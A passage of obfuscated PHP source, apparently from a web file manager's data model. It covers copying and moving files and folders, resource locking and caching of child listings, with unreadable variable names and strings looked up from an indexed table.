$Ÿîü‰©º[$–¨Ùã®¿[593]] . $ßòÌ¾Õú . $–¨Ùã®¿[622]), $–¨Ùã®¿[623] => 0); $Ç»Êüú = $–¨Ùã®¿[624]; $Õ¢¤²µ = "\114\105\106\x54\40\x4a\117\111\116\x20{$this->tablePrefix}\151\x6f\x5f\x66\151\154\145\x20\x66\151\154\145\40\x6f\x6e\40\x73\157\165\162\143\145\x2e\x66\151\x6c\145\x49\x44\x20\x3d\x20\x66\151\x6c\145\x2e\x66\151\x6c\145\111\104"; $ÈéÀŠÄ = $this->alias($–¨Ùã®¿[528])->field($Ç»Êüú)->where($¨ŠüÛ³è)->join($Õ¢¤²µ)->select(); $this->_listAppendAuth($ÈéÀŠÄ); $this->_listAppendUser($ÈéÀŠÄ); $this->_listAppendPath($ÈéÀŠÄ); $ÈéÀŠÄ = array_to_keyvalue($ÈéÀŠÄ, $–¨Ùã®¿[193]); $ÑŞí–…œ = "\x2f{$Ÿîü‰©º[$–¨Ùã®¿[32]]}\57"; $ÑŞí–…œ = $ÑŞí–…œ == $–¨Ùã®¿[601] ? $–¨Ùã®¿[8] : $ÑŞí–…œ; $ÍÏ¼Ú½Ç = array(); foreach ($ÈéÀŠÄ as $µ™Çë™ª => $©¥´¹ó) { $ßâÜ¸î = $this->parentLevelArray($©¥´¹ó[$–¨Ùã®¿[593]]); array_shift($ßâÜ¸î); $¯Áõä‡ = $ÑŞí–…œ; for ($‰Á¶“Å¶ = 0; $‰Á¶“Å¶ < count($ßâÜ¸î); $‰Á¶“Å¶++) { $¯Áõä‡ .= $ÈéÀŠÄ[$ßâÜ¸î[$‰Á¶“Å¶]][$–¨Ùã®¿[32]] . $–¨Ùã®¿[8]; } $¯Áõä‡ .= $©¥´¹ó[$–¨Ùã®¿[32]]; if ($©¥´¹ó[$–¨Ùã®¿[494]]) { $¯Áõä‡ .= $–¨Ùã®¿[8]; } $È‹ç˜éı = array($–¨Ùã®¿[504] => str_replace($–¨Ùã®¿[601], $–¨Ùã®¿[8], str_replace($–¨Ùã®¿[601], $–¨Ùã®¿[8], str_replace($–¨Ùã®¿[601], $–¨Ùã®¿[8], $¯Áõä‡))), $–¨Ùã®¿[625] => intval($©¥´¹ó[$–¨Ùã®¿[494]]), $–¨Ùã®¿[626] => intval($©¥´¹ó[$–¨Ùã®¿[79]]), $–¨Ùã®¿[88] => intval($©¥´¹ó[$–¨Ùã®¿[88]]), $–¨Ùã®¿[90] => $this->pathInfoFilter($©¥´¹ó)); if (!$È‹ç˜éı[$–¨Ùã®¿[494]]) { $È‹ç˜éı[$–¨Ùã®¿[550]] = $©¥´¹ó[$–¨Ùã®¿[550]]; } $ÍÏ¼Ú½Ç[] = $È‹ç˜éı; } $ÍÏ¼Ú½Ç = array_sort_by($ÍÏ¼Ú½Ç, $–¨Ùã®¿[87]); return $ÍÏ¼Ú½Ç; } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($Ä…ÍÉ‰â) { $ü±„†Äâ =& $_SERVER[³Ôà×Ó]; if (!$this->allowLock()) { return; } $this->_lockCheck($ü±„†Äâ[627], $Ä…ÍÉ‰â); $§€›ö©· = 1; $this->_lockEvent($Ä…ÍÉ‰â, array($ü±„†Äâ[628], $ü±„†Äâ[629]), $§€›ö©·); $this->_lockParent($Ä…ÍÉ‰â, array($ü±„†Äâ[629]), $§€›ö©·); $this->_lockEvent($Ä…ÍÉ‰â, array($ü±„†Äâ[630], $ü±„†Äâ[631]), $§€›ö©·); $this->_lockCheckEnd($ü±„†Äâ[627], $Ä…ÍÉ‰â); } public function lockCopyEnd($ı÷èÔ¥¬) { $–İŒ¾Óå =& $_SERVER[³Ôà×Ó]; if (!$this->allowLock()) { return; } $«Å±¼ÁÙ = 0; $this->_lockEvent($ı÷èÔ¥¬, array($–İŒ¾Óå[628], $–İŒ¾Óå[629]), $«Å±¼ÁÙ); $this->_lockParent($ı÷èÔ¥¬, array($–İŒ¾Óå[629]), $«Å±¼ÁÙ); $this->_lockEvent($ı÷èÔ¥¬, array($–İŒ¾Óå[630], $–İŒ¾Óå[631]), $«Å±¼ÁÙ); } public function lockWriteStart($·Ó„Ñ, $··¡—•å = '') { $ıİ ¦°Ë =& $_SERVER[³Ôà×Ó]; if (!$this->allowLock()) { return; } $this->_lockCheck($ıİ ¦°Ë[628], $·Ó„Ñ); $ñœšéÀÇ = 1; $this->_lockKey($ıİ ¦°Ë[632] . $·Ó„Ñ . $ıİ ¦°Ë[10] . $··¡—•å, $ñœšéÀÇ); $this->_lockEvent($·Ó„Ñ, array($ıİ ¦°Ë[627], $ıİ ¦°Ë[629]), $ñœšéÀÇ); $this->_lockParent($·Ó„Ñ, array($ıİ ¦°Ë[627], $ıİ ¦°Ë[629]), $ñœšéÀÇ); $this->_lockCheckEnd($ıİ ¦°Ë[628], $·Ó„Ñ); } public function lockWriteEnd($Ø’Ğ¤‰‚, $‡ÉàüÓ­ = '') { $µ’¢È›š =& $_SERVER[³Ôà×Ó]; if (!$this->allowLock()) { return; } $û‚¡ôüˆ = 0; $this->_lockKey($µ’¢È›š[632] . $Ø’Ğ¤‰‚ . $µ’¢È›š[10] . $‡ÉàüÓ­, $û‚¡ôüˆ); $this->_lockEvent($Ø’Ğ¤‰‚, array($µ’¢È›š[627], $µ’¢È›š[629]), $û‚¡ôüˆ); $this->_lockParent($Ø’Ğ¤‰‚, array($µ’¢È›š[627], $µ’¢È›š[629]), $û‚¡ôüˆ); } public function lockMoveStart($€™ğãã) { $¢ò©Ş¡¨ =& $_SERVER[³Ôà×Ó]; if (!$this->allowLock()) { return; } $this->_lockCheck($¢ò©Ş¡¨[629], $€™ğãã); $«–„êä = 1; $this->_lockKey($¢ò©Ş¡¨[633] . $€™ğãã, $«–„êä); $this->_lockEvent($€™ğãã, array($¢ò©Ş¡¨[627], $¢ò©Ş¡¨[628]), $«–„êä); $this->_lockParent($€™ğãã, array($¢ò©Ş¡¨[627], $¢ò©Ş¡¨[629]), $«–„êä); $this->_lockEvent($€™ğãã, array($¢ò©Ş¡¨[634], $¢ò©Ş¡¨[630], $¢ò©Ş¡¨[631]), $«–„êä); $this->_lockCheckEnd($¢ò©Ş¡¨[629], $€™ğãã); } public function lockMoveEnd($¹¦¶¢±) { $¢áß¢™Ÿ =& $_SERVER[³Ôà×Ó]; if (!$this->allowLock()) { return; } $ÁÃèÄ‰ã = 0; $this->_lockKey($¢áß¢™Ÿ[633] . $¹¦¶¢±, $ÁÃèÄ‰ã); $this->_lockEvent($¹¦¶¢±, array($¢áß¢™Ÿ[627], $¢áß¢™Ÿ[628]), $ÁÃèÄ‰ã); $this->_lockParent($¹¦¶¢±, array($¢áß¢™Ÿ[627], $¢áß¢™Ÿ[629]), $ÁÃèÄ‰ã); $this->_lockEvent($¹¦¶¢±, array($¢áß¢™Ÿ[634], $¢áß¢™Ÿ[630], $¢áß¢™Ÿ[631]), $ÁÃèÄ‰ã); } private function _lockCheck($’‹èÎ¶’, $°”à­°Š) { $ Şêœ¬ò =& $_SERVER[³Ôà×Ó]; $®‡ÜÍ€º = $this->sourceInfo($°”à­°Š); $ÕËêÎß = $’‹èÎ¶’ . $ Şêœ¬ò[10] . $°”à­°Š; $this->_lockTimeStart[$ÕËêÎß] = timeFloat(); if (!is_array($®‡ÜÍ€º)) { return; } $ªø…¼©ô = LNG($ Şêœ¬ò[635]); CacheLock::setErrorMsg($ Şêœ¬ò[176] . htmlspecialchars($®‡ÜÍ€º[$ Şêœ¬ò[32]]) . $ Şêœ¬ò[178] . $ªø…¼©ô); $this->_lockKey($ÕËêÎß, 1); $this->_lockKey($ÕËêÎß, 0); $¼ã£¦ß™ = array_reverse($this->parentLevelArray($®‡ÜÍ€º[$ Şêœ¬ò[593]])); foreach ($¼ã£¦ß™ as $—í°”Ñ–) { $ÕËêÎß = $’‹èÎ¶’ . $ Şêœ¬ò[636] . $—í°”Ñ–; if (CacheLock::lockGet($ Şêœ¬ò[637] . $ÕËêÎß)) { $®‡ÜÍ€º = $this->sourceInfo($—í°”Ñ–); CacheLock::setErrorMsg($ Şêœ¬ò[176] . htmlspecialchars($®‡ÜÍ€º[$ Şêœ¬ò[32]]) . $ Şêœ¬ò[178] . $ªø…¼©ô); $this->_lockKey($ÕËêÎß, 1); $this->_lockKey($ÕËêÎß, 0); } } } private function _lockCheckEnd($ÌÛØşú¸, $ĞâĞÍ™Æ) { $Øâ¥ù° =& $_SERVER[³Ôà×Ó]; $²ç¯Ô‡ç = $ÌÛØşú¸ . $Øâ¥ù°[10] . $ĞâĞÍ™Æ; CacheLock::setErrorMsg($Øâ¥ù°[463]); if (!isset($this->_lockTimeStart[$²ç¯Ô‡ç])) { return; } $û»±é²´ = timeFloat() - $this->_lockTimeStart[$²ç¯Ô‡ç]; unset($this->_lockTimeStart[$²ç¯Ô‡ç]); if ($û»±é²´ > 0.5) { unset(self::$cacheSourceInfo[$Øâ¥ù°[542] . $ĞâĞÍ™Æ]); } $ÜÏ•€¬ = $this->sourceInfo($ĞâĞÍ™Æ); if (!$ÜÏ•€¬) { show_json(LNG($Øâ¥ù°[108]), !1); } } private function _lockParent($¢èÑçß¿, $ÏîØ«ªÎ, $öõ•ê¿ã) { if (!$this->autoLockSet) { return; } $Ê©“ä¦¤ = $this->sourceInfo($¢èÑçß¿); if (!is_array($Ê©“ä¦¤)) { return; } $²Ú©Ø×¾ = array_reverse($this->parentLevelArray($Ê©“ä¦¤[$_SERVER[³Ôà×Ó][593]])); foreach ($²Ú©Ø×¾ as $Ü™˜ãÊ) { $this->_lockEvent($Ü™˜ãÊ, $ÏîØ«ªÎ, $öõ•ê¿ã); } } private function _lockEvent($¸Ô‰‰Õú, $šöê“Ìí, $ÁÃÇË¹«) { $ã–®ˆ•Í =& $_SERVER[³Ôà×Ó]; if (!$this->autoLockSet) { return; } foreach ($šöê“Ìí as $Õğâåí) { $¿¾ƒù½ = $Õğâåí . $ã–®ˆ•Í[10] . $¸Ô‰‰Õú; if ($ÁÃÇË¹« && CacheLock::lockGet($ã–®ˆ•Í[637] . $¿¾ƒù½)) { continue; } $this->_lockKey($¿¾ƒù½, $ÁÃÇË¹«); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($ï»ë´†, $ÌßÂû„‹ = 1) { $°øÅåÆ = $_SERVER[³Ôà×Ó][637] . md5($ï»ë´†); if ($ÌßÂû„‹) { if (isset(self::$_lockItemArr[$°øÅåÆ])) { return; } self::$_lockItemArr[$°øÅåÆ] = 1; CacheLock::lock($°øÅåÆ, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$°øÅåÆ])) { return; } unset(self::$_lockItemArr[$°øÅåÆ]); CacheLock::unlock($°øÅåÆ); } } public function isParentOf($ÔÌõî¡, $¿èõÅ¯™) { $àèìóÒ¹ =& $_SERVER[³Ôà×Ó]; $¹¾®úºĞ = $this->sourceInfo($ÔÌõî¡); $ù¸Ó™˜Ş = $this->sourceInfo($¿èõÅ¯™); $Ø›åÉÂÓ = $¹¾®úºĞ[$àèìóÒ¹[593]] . $¹¾®úºĞ[$àèìóÒ¹[193]] . $àèìóÒ¹[50]; $ü¡Ø¡• = $ù¸Ó™˜Ş[$àèìóÒ¹[593]] . $ù¸Ó™˜Ş[$àèìóÒ¹[193]] . $àèìóÒ¹[50]; $á¡´å°ƒ = strpos($ü¡Ø¡•, $Ø›åÉÂÓ) === 0; return $á¡´å°ƒ; } private $targetIsDelete = 0; public function copy($¯±Àñş , $°»ñ›Üñ, $Ù˜êç…¦ = REPEAT_REPLACE, $¡ÎıØ‡¿ = '') { $º¦¶—¹‹ =& $_SERVER[³Ôà×Ó]; $¤Ëí¦Òò = $this->sourceInfo($¯±Àñş ); $Éğù°» = $this->sourceInfo($°»ñ›Üñ); if (!$¤Ëí¦Òò || !$Éğù°» || $Éğù°»[$º¦¶—¹‹[494]] != $º¦¶—¹‹[91]) { return !1; } if ($this->isParentOf($¯±Àñş , $°»ñ›Üñ)) { return !1; } $Ÿ±§—ğ¾ = $¡ÎıØ‡¿ ? $¡ÎıØ‡¿ : $¤Ëí¦Òò[$º¦¶—¹‹[32]]; $this->lockCopyStart($¯±Àñş ); $this->lockWriteStart($°»ñ›Üñ, $Ÿ±§—ğ¾); $—†ì¿Úö = array($º¦¶—¹‹[638] => array(), $º¦¶—¹‹[639] => array(), $º¦¶—¹‹[640] => array()); $this->targetIsDelete = intval($¤Ëí¦Òò[$º¦¶—¹‹[514]]); $³£³€ÁÒ = $this->fileNameExistAuto($°»ñ›Üñ, $¤Ëí¦Òò); $°‘ŒúûÈ = $this->_copy($¯±Àñş , $°»ñ›Üñ, $Ù˜êç…¦, $—†ì¿Úö, !0, $¡ÎıØ‡¿); $this->_childrenListClear(); $this->lockCopyEnd($¯±Àñş ); $this->lockWriteEnd($°»ñ›Üñ, $Ÿ±§—ğ¾); if ($¤Ëí¦Òò[$º¦¶—¹‹[494]] == $º¦¶—¹‹[91] && $³£³€ÁÒ == $°‘ŒúûÈ) { $this->folderSizeResetChildren($³£³€ÁÒ); } Model($º¦¶—¹‹[641])->addAll($—†ì¿Úö[$º¦¶—¹‹[639]], array(), !0); if ($³£³€ÁÒ != $°‘ŒúûÈ || $¤Ëí¦Òò[$º¦¶—¹‹[494]] == $º¦¶—¹‹[91]) { Model($º¦¶—¹‹[642])->eventCopy($°‘ŒúûÈ); } $this->saveAll($—†ì¿Úö[$º¦¶—¹‹[640]]); Model($º¦¶—¹‹[230])->linkAdd($—†ì¿Úö[$º¦¶—¹‹[638]]); $this->folderSizeReset($°»ñ›Üñ); $this->updateModifyTime($°»ñ›Üñ); return $°‘ŒúûÈ; } private function _copy($ÄĞò×£”, $şğªù†, $òÉĞÃÆ¦, &$¸ï‹Œ™, $‰»¡âóÕ, $öŸ£Şçï = '') { $¼¢±¨Õˆ =& $_SERVER[³Ôà×Ó]; $ò…ÇæÀ = $this->sourceInfoCache($ÄĞò×£”); $¢ïµ¥çù = $ò…ÇæÀ[$¼¢±¨Õˆ[494]] == $¼¢±¨Õˆ[91]; $Ìàš‡¸ = $öŸ£Şçï ? $öŸ£Şçï : $ò…ÇæÀ[$¼¢±¨Õˆ[32]]; $ËŞÏÍÌï = $this->fileNameExistAuto($şğªù†, $ò…ÇæÀ); if ($‰»¡âóÕ) { $this->_childrenAllMake($ÄĞò×£”); if ($¢ïµ¥çù && $ËŞÏÍÌï) { $this->_childrenAllMake($ËŞÏÍÌï); } } if (!$ËŞÏÍÌï) { return $this->_copyCreate($ÄĞò×£”, $şğªù†, $Ìàš‡¸, $¸ï‹Œ™); } $‡†¹ìè = $ËŞÏÍÌï; if ($¢ïµ¥çù) { if ($òÉĞÃÆ¦ == REPEAT_RENAME_FOLDER) { $Ìàš‡¸ = $this->fileNameAutoCache($şğªù†, $Ìàš‡¸, $òÉĞÃÆ¦, $¢ïµ¥çù); $‡†¹ìè = $this->_copyCreate($ÄĞò×£”, $şğªù†, $Ìàš‡¸, $¸ï‹Œ™); } else { $¬æÈ¡õâ = $this->_childrenList($ÄĞò×£”); foreach ($¬æÈ¡õâ as $¡É•ã) { $this->_copy($¡É•ã[$¼¢±¨Õˆ[193]], $ËŞÏÍÌï, $òÉĞÃÆ¦, $¸ï‹Œ™, !1); } } } else { if ($òÉĞÃÆ¦ == REPEAT_RENAME || $òÉĞÃÆ¦ == REPEAT_RENAME_FOLDER) { $Ìàš‡¸ = $this->fileNameAutoCache($şğªù†, $Ìàš‡¸, $òÉĞÃÆ¦, $¢ïµ¥çù); $‡†¹ìè = $this->_copyCreate($ÄĞò×£”, $şğªù†, $Ìàš‡¸, $¸ï‹Œ™); } else { if ($òÉĞÃÆ¦ == REPEAT_REPLACE) { $ˆÄ²Ó‘ó = $this->sourceInfoCache($ËŞÏÍÌï); $•–ÕÉ´ö = $this->fileHistory($ˆÄ²Ó‘ó, $ò…ÇæÀ[$¼¢±¨Õˆ[550]], $ò…ÇæÀ[$¼¢±¨Õˆ[79]]); if ($•–ÕÉ´ö) { $¸ï‹Œ™[$¼¢±¨Õˆ[638]][] = $ò…ÇæÀ[$¼¢±¨Õˆ[550]]; } } else { if ($òÉĞÃÆ¦ == REPEAT_SKIP) { } } } Hook::trigger($¼¢±¨Õˆ[643], array($¼¢±¨Õˆ[644], $ò…ÇæÀ, 0)); } return $‡†¹ìè; } private function _copyCreate($ëÀ›äŸı, $àŸÉÌ¥, $Œ‹© , &$»—”šõó) { $º´³ĞÓ« =& $_SERVER[³Ôà×Ó]; $±¨ÄÚ‘ = $this->sourceInfoCache($ëÀ›äŸı); $ÙÊÊÑ±ù = $this->sourceInfoCache($àŸÉÌ¥); $ÁšÔÅÊ = $this->_makeItemData($±¨ÄÚ‘, $ÙÊÊÑ±ù, $Œ‹© ); Hook::trigger($º´³ĞÓ«[645], $ÁšÔÅÊ); Hook::trigger($º´³ĞÓ«[646], array($º´³ĞÓ«[647], $ÁšÔÅÊ, 0)); $õ–õÖ¯ = $this->add($ÁšÔÅÊ); $šò’Õ¼Í = array($º´³ĞÓ«[193] => $õ–õÖ¯, $º´³ĞÓ«[32] => $Œ‹© ); $this->_copyApplyMeta($šò’Õ¼Í, $»—”šõó); if ($±¨ÄÚ‘[$º´³ĞÓ«[494]] != $º´³ĞÓ«[91]) { $»—”šõó[$º´³ĞÓ«[638]][] = $±¨ÄÚ‘[$º´³ĞÓ«[550]]; return $õ–õÖ¯; } $·äí«Íç = array(); $ê†¢¿ = array(); $this->_childrenListAll($ëÀ›äŸı, $·äí«Íç); $‚»×‡Í = count($·äí«Íç); if ($‚»×‡Í == 0) { return $õ–õÖ¯; } $‹ÅÄÜÁ« = $this->sourceInfo($õ–õÖ¯); foreach ($·äí«Íç as $É¶£øÆÇ) { $µâ±øÂŒ = $this->_makeItemData($É¶£øÆÇ, $‹ÅÄÜÁ«, $É¶£øÆÇ[$º´³ĞÓ«[32]]); $µâ±øÂŒ[$º´³ĞÓ«[593]] = $É¶£øÆÇ[$º´³ĞÓ«[593]]; $ê†¢¿[] = $µâ±øÂŒ; } $this->chunkEventSet($º´³ĞÓ«[648], array($º´³ĞÓ«[649], $ÁšÔÅÊ, $‚»×‡Í)); $this->addAll($ê†¢¿, array(), !1); $ˆ½É²Æ¸ = $this->where(array($º´³ĞÓ«[192] => $õ–õÖ¯))->select(); $ŠÕâ¬èÏ = $this->_childrenMakeRelation($·äí«Íç, $ˆ½É²Æ¸); $ŠÕâ¬èÏ[$ëÀ›äŸı] = $õ–õÖ¯; $ãØãİà¨ = array(); $ç¹ß¥ØÖ = array(); foreach ($ˆ½É²Æ¸ as $É¶£øÆÇ) { $‰ùŠÀ¿æ = $É¶£øÆÇ[$º´³ĞÓ«[193]]; $µ€¿¹ºÇ = $this->_childrenMatch($ŠÕâ¬èÏ, $É¶£øÆÇ, $‹ÅÄÜÁ«); $ãØãİà¨[] = array($º´³ĞÓ«[193], $‰ùŠÀ¿æ, $º´³ĞÓ«[192], $µ€¿¹ºÇ[$º´³ĞÓ«[192]]); $ç¹ß¥ØÖ[] = array($º´³ĞÓ«[193], $‰ùŠÀ¿æ, $º´³ĞÓ«[593], $µ€¿¹ºÇ[$º´³ĞÓ«[593]]); $this->_copyApplyMeta($É¶£øÆÇ, $»—”šõó); if ($É¶£øÆÇ[$º´³ĞÓ«[494]] != $º´³ĞÓ«[91]) { $»—”šõó[$º´³ĞÓ«[638]][] = $É¶£øÆÇ[$º´³ĞÓ«[550]]; } } $this->chunkEventSet($º´³ĞÓ«[650], array($º´³ĞÓ«[651], $ÁšÔÅÊ, $‚»×‡Í)); $this->saveAll($ãØãİà¨); $this->chunkEventSet($º´³ĞÓ«[652], array($º´³ĞÓ«[653], $ÁšÔÅÊ, $‚»×‡Í)); $this->saveAll($ç¹ß¥ØÖ); return $õ–õÖ¯; } private function _childrenMakeRelation($œ™¿ÌÉ÷, $ƒ±‘Ùº) { $Æ‡¡¾ß× =& $_SERVER[³Ôà×Ó]; $Ñí™ôÛ« = array(); $ıíÍÕı = array(); foreach ($œ™¿ÌÉ÷ as $ªÉøïñ§) { $ÙúÈšù¼ = $ªÉøïñ§[$Æ‡¡¾ß×[32]] . $Æ‡¡¾ß×[8] . $ªÉøïñ§[$Æ‡¡¾ß×[593]]; $Ñí™ôÛ«[$ÙúÈšù¼] = $ªÉøïñ§[$Æ‡¡¾ß×[193]]; } foreach ($ƒ±‘Ùº as $ªÉøïñ§) { $ÙúÈšù¼ = $ªÉøïñ§[$Æ‡¡¾ß×[32]] . $Æ‡¡¾ß×[8] . $ªÉøïñ§[$Æ‡¡¾ß×[593]]; $Ïó½ÓÅØ = $Ñí™ôÛ«[$ÙúÈšù¼]; $ıíÍÕı[$Ïó½ÓÅØ] = $ªÉøïñ§[$Æ‡¡¾ß×[193]]; } return $ıíÍÕı; } private function _childrenMatch($ï÷¹“ŸŞ, $ùä€»Šó, $“ºşìşº) { $‰—°ŸŠÌ =& $_SERVER[³Ôà×Ó]; $àìŠ§ÎÅ = $“ºşìşº[$‰—°ŸŠÌ[593]]; $Ô®ğÊ·ç = $this->parentLevelArray($ùä€»Šó[$‰—°ŸŠÌ[593]]); foreach ($Ô®ğÊ·ç as $‡úÈï©‡) { if (isset($ï÷¹“ŸŞ[$‡úÈï©‡])) { $àìŠ§ÎÅ .= $ï÷¹“ŸŞ[$‡úÈï©‡] . $‰—°ŸŠÌ[654]; } } $àìŠ§ÎÅ = rtrim($àìŠ§ÎÅ, $‰—°ŸŠÌ[50]) . $‰—°ŸŠÌ[50]; $¬”Õ· = $this->parentLevelArray($àìŠ§ÎÅ); $¼…¬ùÇ– = $¬”Õ·[count($¬”Õ·) - 1]; return array($‰—°ŸŠÌ[192] => $¼…¬ùÇ–, $‰—°ŸŠÌ[593] => $àìŠ§ÎÅ); } private function _makeItemData($ìõæÍ, $¹È‡ç©°, $´çÃşÂ) { $ĞÊîº =& $_SERVER[³Ôà×Ó]; $³Ê÷ÁÅÕ = array($ĞÊîº[655] => $ìõæÍ[$ĞÊîº[494]], $ĞÊîº[503] => $´çÃşÂ, $ĞÊîº[656] => $ìõæÍ[$ĞÊîº[495]] ? $ìõæÍ[$ĞÊîº[495]] : $ĞÊîº[12], $ĞÊîº[551] => $ìõæÍ[$ĞÊîº[550]] ? $ìõæÍ[$ĞÊîº[550]] : 0, $ĞÊîº[626] => $ìõæÍ[$ĞÊîº[79]] ? $ìõæÍ[$ĞÊîº[79]] : 0, $ĞÊîº[657] => intval($¹È‡ç©°[$ĞÊîº[190]]), $ĞÊîº[658] => intval($¹È‡ç©°[$ĞÊîº[578]]), $ĞÊîº[659] => intval(USER_ID), $ĞÊîº[660] => intval(USER_ID), $ĞÊîº[486] => intval($¹È‡ç©°[$ĞÊîº[193]]), $ĞÊîº[661] => $¹È‡ç©°[$ĞÊîº[593]] . $¹È‡ç©°[$ĞÊîº[193]] . $ĞÊîº[50], $ĞÊîº[507] => $ìõæÍ[$ĞÊîº[88]] ? $ìõæÍ[$ĞÊîº[88]] : time(), $ĞÊîº[513] => 0, $ĞÊîº[662] => $ĞÊîº[12]); return $³Ê÷ÁÅÕ; } private function _copyApplyMeta($øÒ„úÎÎ, &$¬º²³ Â) { $ÌÙä€®Ô =& $_SERVER[³Ôà×Ó]; $Ç‘²‡Üé = $øÒ„úÎÎ[$ÌÙä€®Ô[193]]; $“ñÔğã = $øÒ„úÎÎ[$ÌÙä€®Ô[32]]; if (!isset($øÒ„úÎÎ[$ÌÙä€®Ô[663]]) || !$øÒ„úÎÎ[$ÌÙä€®Ô[663]] || $øÒ„úÎÎ[$ÌÙä€®Ô[663]] == $ÌÙä€®Ô[228]) { $¬º²³ Â[$ÌÙä€®Ô[640]][] = array($ÌÙä€®Ô[193], $Ç‘²‡Üé, $ÌÙä€®Ô[663], short_id($Ç‘²‡Üé)); } if (Input::check($“ñÔğã, $ÌÙä€®Ô[664])) { $¬º²³ Â[$ÌÙä€®Ô[639]][] = array($ÌÙä€®Ô[193] => $Ç‘²‡Üé, $ÌÙä€®Ô[97] => $ÌÙä€®Ô[547], $ÌÙä€®Ô[459] => str_replace($ÌÙä€®Ô[53], $ÌÙä€®Ô[12], Pinyin::get($“ñÔğã))); $¬º²³ Â[$ÌÙä€®Ô[639]][] = array($ÌÙä€®Ô[193] => $Ç‘²‡Üé, $ÌÙä€®Ô[97] => $ÌÙä€®Ô[546], $ÌÙä€®Ô[459] => Pinyin::get($“ñÔğã, $ÌÙä€®Ô[665])); } $¬º²³ Â[$ÌÙä€®Ô[639]][] = array($ÌÙä€®Ô[193] => $Ç‘²‡Üé, $ÌÙä€®Ô[97] => $ÌÙä€®Ô[526], $ÌÙä€®Ô[459] => KodSort::makeStr($“ñÔğã)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($™ãÑÄúë) { $ŠÈ¤†Èõ =& $_SERVER[³Ôà×Ó]; $«òº¬³ = $this->sourceInfo($™ãÑÄúë); $¤È©ˆ É = $ŠÈ¤†Èõ[666]; $¶•…¨ğ÷ = array($ŠÈ¤†Èõ[593] => array($ŠÈ¤†Èõ[621], $«òº¬³[$ŠÈ¤†Èõ[593]] . $™ãÑÄúë . $ŠÈ¤†Èõ[622]), $ŠÈ¤†Èõ[514] => $this->targetIsDelete); $şèÉğÜ£ = $this->field($¤È©ˆ É)->where($¶•…¨ğ÷)->select(); if (!$şèÉğÜ£) { return; } $şèÉğÜ£ = array_to_keyvalue($şèÉğÜ£, $ŠÈ¤†Èõ[193]); foreach ($şèÉğÜ£ as $ÅÕñ“…©) { $¨ÜĞÉ¸É = $ÅÕñ“…©[$ŠÈ¤†Èõ[192]]; $™ãÑÄúë = $ÅÕñ“…©[$ŠÈ¤†Èõ[193]]; if (!isset($this->_childrenListCache[$™ãÑÄúë]) && $ÅÕñ“…©[$ŠÈ¤†Èõ[494]] == $ŠÈ¤†Èõ[91]) { $this->_childrenListCache[$™ãÑÄúë] = array(); } if (!isset($this->_childrenListCache[$¨ÜĞÉ¸É])) { $this->_childrenListCache[$¨ÜĞÉ¸É] = array(); } $this->_childrenListCache[$¨ÜĞÉ¸É][$™ãÑÄúë] = $ÅÕñ“…©; $this->_childrenItemCache[$™ãÑÄúë] = $ÅÕñ“…©; } } private function _childrenListAll($ÖÍŸ½æà, &$ùÚ‹ü ‡) { $•àÅØ‹¼ =& $_SERVER[³Ôà×Ó]; if (!isset($this->_childrenListCache[$ÖÍŸ½æà])) { return; } $Ã”±…‡˜ = $this->_childrenListCache[$ÖÍŸ½æà]; foreach ($Ã”±…‡˜ as $ÃÎİÛ¨ù => $±ØÍ¶Ñ¤) { $ùÚ‹ü ‡[$ÃÎİÛ¨ù] = $±ØÍ¶Ñ¤; if ($±ØÍ¶Ñ¤[$•àÅØ‹¼[494]] == $•àÅØ‹¼[91]) { $this->_childrenListAll($ÃÎİÛ¨ù, $ùÚ‹ü ‡); } } } private function sourceInfoCache($ïŠü±Ş‹) { if (isset($this->_childrenItemCache[$ïŠü±Ş‹])) { return $this->_childrenItemCache[$ïŠü±Ş‹]; } return $this->sourceInfo($ïŠü±Ş‹); } private function _childrenList($Çıá¯íĞ) { if (isset($this->_childrenListCache[$Çıá¯íĞ])) { return $this->_childrenListCache[$Çıá¯íĞ]; } return $this->_childrenListSelect($Çıá¯íĞ); } private function _childrenListSelect($×Ê¢’şã) { $ø±Ğëô =& $_SERVER[³Ôà×Ó]; $©×ˆºàú = array($ø±Ğëô[192] => $×Ê¢’şã, $ø±Ğëô[514] => $this->targetIsDelete); $ÜõÅ©ƒ = $this->where($©×ˆºàú)->select(); $ÜõÅ©ƒ = $ÜõÅ©ƒ ? $ÜõÅ©ƒ : array(); $·«¹Ù· = array_to_keyvalue($ÜõÅ©ƒ, $ø±Ğëô[193]); $this->_childrenListCache[$×Ê¢’şã] = $·«¹Ù·; foreach ($·«¹Ù· as $×Ê¢’şã => $¯¦½ÊÑ) { $this->_childrenItemCache[$×Ê¢’şã] = $¯¦½ÊÑ; } return $·«¹Ù·; } private function fileNameExistAuto($Šµô‚Ÿì, $”åÍ˜˜) { $˜¼³§ş =& $_SERVER[³Ôà×Ó]; if ($”åÍ˜˜[$˜¼³§ş[514]] == $˜¼³§ş[91]) { return $this->fileNameExist($Šµô‚Ÿì, $”åÍ˜˜[$˜¼³§ş[32]]); } return $this->fileNameExistCache($Šµô‚Ÿì, $”åÍ˜˜[$˜¼³§ş[32]]); } private function fileNameExistCache($‡Æ™ãù›, $™ïá—ñ¾) { $«–ÍìŞè =& $_SERVER[³Ôà×Ó]; $™ïá—ñ¾ = strtolower($™ïá—ñ¾); $ƒ¨öë˜… = $this->_childrenList($‡Æ™ãù›); foreach ($ƒ¨öë˜… as $³Ãµ£ª) { if ($™ïá—ñ¾ == strtolower($³Ãµ£ª[$«–ÍìŞè[32]])) { return $³Ãµ£ª[$«–ÍìŞè[193]]; } } return !1; } private function fileNameAutoCache($ËÂ†Ô£Â, $ÍåŞ­î·, $’›§É, $ğéÀƒÓ) { $¹šœ£ë =& $_SERVER[³Ôà×Ó]; $š’Çíúå = $this->_childrenList($ËÂ†Ô£Â); $œå’”† = array_to_keyvalue($š’Çíúå, $¹šœ£ë[12], $¹šœ£ë[32]); return $this->fileNameAutoGet($œå’”†, $ÍåŞ­î·, $’›§É, $ğéÀƒÓ); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($®óŒ˜¡, $ÈÏ…—’, $áÎé±á = REPEAT_REPLACE, $¯ª¬Õ¦« = '') { $ à«”¬õ =& $_SERVER[³Ôà×Ó]; $¿ÕáÓŠ÷ 